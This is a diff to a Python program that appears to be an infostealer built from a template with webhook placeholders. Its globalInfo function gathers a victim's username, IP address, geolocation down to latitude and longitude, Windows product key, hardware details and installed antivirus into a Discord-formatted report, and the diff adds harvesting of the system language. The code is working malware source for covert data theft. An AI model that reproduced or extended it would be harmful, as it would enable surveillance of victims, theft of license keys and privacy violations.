@@ -15,7 +15,7 @@ from sys import executable, stderr
 from ctypes import * 
 from json import loads, dumps, load, dump
 from pathlib import Path
-
+from locale import windows_locale
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
@@ -575,8 +575,17 @@ def globalInfo():
     try:
         avss = avs()
     except:
-        avss = 'Error'
-    system = os.name
+        avss = 'Error gettings installed antivirus'
+    try:
+        system = os.name
+    except:
+        system = "Error getting os name!"
+        
+    try: 
+        windll = ctypes.windll.kernel32
+        language = windows_locale[ windll.GetUserDefaultUILanguage() ]
+    except:
+        language = "Coudln't get windows language"
     try:
         if system == 'Linux':
             gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
@@ -600,7 +609,7 @@ def globalInfo():
     except:
         gpu = "error"
 
-    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \nLatitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\nComputer language : `{language}`\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \nLatitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
     if len(globalinfo) > 1750:
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
